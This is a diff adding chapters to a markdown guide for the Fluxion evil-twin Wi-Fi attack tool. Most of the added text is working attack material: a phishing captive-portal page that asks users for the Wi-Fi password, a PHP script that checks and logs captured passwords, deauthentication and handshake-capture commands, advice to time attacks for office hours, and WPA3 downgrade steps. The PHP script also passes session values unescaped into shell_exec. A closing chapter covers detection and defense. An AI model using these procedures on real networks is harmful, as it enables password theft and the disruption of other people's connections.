@@ -624,6 +624,396 @@ sudo systemctl restart networking
 
 ---
 
+## Chapter 9: Captive Portal Customization
+
+### Portal Templates
+
+Fluxion ships with multiple captive portal templates:
+
+```bash
+# Portal template locations
+ls /usr/share/fluxion/attacks/Captive\ Portal/sites/
+
+# Available templates include:
+# - English, Spanish, French, German, etc.
+# - Brand-specific: Starbucks, airports, hotels
+# - Generic WiFi login pages
+# - Terms of service acceptance pages
+```
+
+### Custom Portal Creation
+
+```bash
+# Create custom portal directory
+mkdir -p /usr/share/fluxion/attacks/Captive\ Portal/sites/custom/
+
+# Create custom login page
+cat > /usr/share/fluxion/attacks/Captive\ Portal/sites/custom/login.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Network Access Required</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 { color: #333; text-align: center; margin-bottom: 20px; }
+        p { color: #666; text-align: center; margin-bottom: 20px; }
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover { background: #5a6fd6; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>WiFi Authentication</h1>
+        <p>Enter the network password to continue</p>
+        <form method="POST" action="login">
+            <input type="password" name="password" placeholder="WiFi Password" required>
+            <button type="submit">Connect</button>
+        </form>
+    </div>
+</body>
+</html>
+EOF
+```
+
+### Portal Verification Script
+
+```php
+<?php
+// login.php - Verify password against captured handshake
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $password = $_POST['password'];
+    $bssid =$_SESSION['target_bssid'];
+    $handshake = $_SESSION['handshake_file'];
+
+    // Use aircrack-ng to verify
+    $cmd = "aircrack-ng -w /tmp/test_password.txt -b $bssid $handshake 2>&1";
+    file_put_contents('/tmp/test_password.txt', $password);
+    $output = shell_exec($cmd);
+
+    if (strpos($output, 'KEY FOUND') !== false) {
+        // Correct password
+        echo json_encode(['status' => 'success', 'password' => $password]);
+        // Log to file
+        file_put_contents('/tmp/captured_passwords.log',
+            date('Y-m-d H:i:s') . " BSSID=$bssid PASSWORD=$password\n",
+            FILE_APPEND);
+    } else {
+        echo json_encode(['status' => 'error', 'message' => 'Incorrect password']);
+    }
+}
+?>
+```
+
+---
+
+## Chapter 10: Deauthentication Deep Dive
+
+### mdk4 Deauth Methods
+
+```bash
+# Broadcast deauth (kick all clients)
+sudo mdk4 wlan0mon d
+
+# Targeted deauth (specific BSSID)
+sudo mdk4 wlan0mon d -b TARGET_BSSID
+
+# Continuous deauth (until stopped)
+sudo mdk4 wlan0mon d -B TARGET_BSSID
+
+# Deauth with custom interval
+sudo mdk4 wlan0mon d -t TARGET_BSSID -s 10  # 10 second interval
+```
+
+### 802.11w (PMF) Considerations
+
+```bash
+# Protected Management Frames (PMF) prevent deauth attacks
+# WPA3 mandates PMF; WPA2 makes it optional
+
+# Check if target uses PMF
+airodump-ng wlan0mon --bssid TARGET_BSSID
+# Look for "MFP" or "PMF" in capabilities
+
+# If PMF is enabled:
+# - Deauth frames are ignored
+# - Fluxion deauth will not work
+# - Need alternative attack vector
+
+# Workaround: Target clients that don't support PMF
+# Some clients connect without PMF even if AP supports it
+```
+
+### Timing Considerations
+
+```
+Optimal deauth timing:
+- Business hours: Higher client density, more chances
+- After lunch: Users returning to desks, reconnecting
+- Avoid: Late night, weekends (low traffic)
+
+Deauth strategy:
+1. Capture handshake first (passive or active)
+2. Start deauth to kick clients
+3. Clients reconnect to rogue AP (evil twin)
+4. Client enters password on captive portal
+5. Password verified against handshake
+6. Attack terminates on correct password
+```
+
+---
+
+## Chapter 11: Handshake Capture Techniques
+
+### Passive Capture
+
+```bash
+# Wait for natural handshakes
+airodump-ng -c 6 --bssid TARGET_BSSID -w /tmp/handshake wlan0mon
+
+# Clients naturally connect/disconnect
+# Handshake is captured when they reconnect
+# May take minutes to hours
+```
+
+### Active Deauth Capture
+
+```bash
+# Force handshake by deauthing clients
+# Step 1: Start capture
+airodump-ng -c 6 --bssid TARGET_BSSID -w /tmp/handshake wlan0mon &
+
+# Step 2: Deauth specific client
+aireplay-ng --deauth 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon
+
+# Step 3: Verify handshake
+aircrack-ng /tmp/handshake-01.cap
+# Should show "1 handshake" with BSSID
+```
+
+### EAPOL Frame Capture
+
+```bash
+# The WPA 4-way handshake uses EAPOL frames
+# Capture with filter
+sudo tcpdump -i wlan0mon -w eapol_capture.pcap "ether proto 0x888e"
+
+# Analyze EAPOL frames
+tshark -r eapol_capture.pcap -Y "eapol"
+```
+
+### Handshake Quality
+
+```bash
+# A complete handshake requires all 4 EAPOL messages
+# Minimum for password verification: messages 1 and 2
+
+# Verify handshake completeness
+aircrack-ng handshake.cap 2>&1 | grep "handshake"
+
+# If handshake is partial:
+# - Try deauthing again
+# - Wait for natural reconnection
+# - Target different clients
+```
+
+---
+
+## Chapter 12: WPA3 Considerations
+
+### WPA3-SAE Attacks
+
+```
+WPA3-SAE (Simultaneous Authentication of Equals) replaces WPA2-PSK:
+- Resistant to offline dictionary attacks
+- Uses Dragonfly key exchange
+- No capture-and-crack workflow
+
+Fluxion limitations against WPA3:
+- Captive portal attack still works (social engineering)
+- Deauth attacks may be blocked by PMF
+- Handshake capture is different (SAE commit/confirm)
+```
+
+### WPA3 Transition Mode
+
+```bash
+# Many APs run in WPA2/WPA3 transition mode
+# WPA2 clients connect with PSK (vulnerable)
+# WPA3 clients use SAE (resistant)
+
+# Identify transition mode
+airodump-ng wlan0mon | grep -i "wpa3\|sae\|transition"
+
+# Attack strategy:
+# 1. Target WPA2 clients specifically
+# 2. Deauth to force reconnection
+# 3. WPA2 clients fall back to PSK
+# 4. Capture WPA2 handshake
+```
+
+### OWE (Opportunistic Wireless Encryption)
+
+```bash
+# OWE replaces open networks (no password)
+# Provides encryption but no authentication
+# Vulnerable to passive sniffing
+
+# Identify OWE networks
+airodump-ng wlan0mon | grep -i "owe"
+
+# OWE networks don't need Fluxion
+# Standard MITM attacks work
+```
+
+---
+
+## Chapter 13: Multi-AP and Enterprise Scenarios
+
+### Multi-BSSID Attack
+
+```bash
+# Some APs broadcast multiple SSIDs
+# Target all SSIDs from same physical AP
+
+# Scan for all BSSIDs
+airodump-ng wlan0mon | grep "TARGET_VENDOR"
+
+# Attack each SSID
+for bssid in 00:11:22:33:44:55 00:11:22:33:44:56; do
+    echo "[*] Targeting $bssid"
+    sudo fluxion --bssid "$bssid"
+done
+```
+
+### Enterprise WiFi Assessment
+
+```bash
+# WPA2-Enterprise uses 802.1X/RADIUS
+# Fluxion cannot capture enterprise credentials via captive portal
+
+# Alternative attacks for enterprise WiFi:
+# 1. Evil twin + EAP relay (hostapd-mana)
+# 2. Credential capture from RADIUS logs
+# 3. Default credential testing
+# 4. Certificate-based attacks
+
+# Detect enterprise vs PSK
+airodump-ng wlan0mon --bssid TARGET | grep -i "auth"
+# PSK: Authentication: Open System
+# Enterprise: Authentication: 802.1X
+```
+
+---
+
+## Chapter 14: Detection and Defense
+
+### Evil Twin Detection
+
+```
+Detection methods:
+1. WIPS (Wireless Intrusion Prevention System)
+   - RF fingerprinting
+   - Beacon analysis
+   - Signal strength comparison
+
+2. Client-side detection:
+   - Certificate pinning
+   - AP reputation databases
+   - Signal strength anomalies
+
+3. Network-level detection:
+   - Duplicate BSSID alerts
+   - Deauth flood detection
+   - Captive portal detection
+```
+
+### Blue Team Countermeasures
+
+```bash
+# 1. Deploy WPA3-SAE
+# Mandatory PMF prevents deauth
+# SAE prevents offline dictionary attacks
+
+# 2. Enable 802.11w (PMF) on WPA2
+# hostapd.conf:
+# ieee80211w=2  # Required
+# wpa=2
+# wpa_key_mgmt=WPA-PSK-SHA256
+
+# 3. Deploy WIPS
+# Aruba, Cisco, Mist wireless IDS
+# Detects evil twins automatically
+
+# 4. Client education
+# Don't connect to unknown networks
+# Verify SSID before entering credentials
+# Use VPN on public WiFi
+
+# 5. Network segmentation
+# Isolate WiFi from sensitive resources
+# Use separate VLANs for WiFi
+
+# 6. Monitor for deauth floods
+# Alert on excessive deauth frames
+# Use IDS signatures for mdk4/aireplay
+```
+
+### Detection Snort/Suricata Rules
+
+```
+# Detect deauthentication flood
+alert wifi any any -> any any (
+  msg:"WiFi Deauth Flood";
+  wifi.fc.type_subtype: 0x0c;
+  threshold:type both, track by_src, count 10, seconds 5;
+  sid:1000001; rev:1;
+)
+
+# Detect duplicate SSID (evil twin)
+alert wifi any any -> any any (
+  msg:"Possible Evil Twin - Duplicate SSID";
+  wifi.mgmt.ssid: "TargetSSID";
+  threshold:type both, track by_src, count 2, seconds 10;
+  sid:1000002; rev:1;
+)
+```
+
+---
+
 ## Resources
 
 - **GitHub:** https://github.com/FluxionNetwork/fluxion
@@ -635,3 +1025,5 @@ sudo systemctl restart networking
 - **Aircrack-ng:** https://www.aircrack-ng.org
 - **hostapd:** https://w1.fi/hostapd/
 - **WPA3 Specification:** https://www.wi-fi.org/discover-wi-fi/security
+- **IEEE 802.11w:** https://standards.ieee.org/standard/802_11w-2009.html
+- **SAE Protocol:** https://tools.ietf.org/html/rfc7664
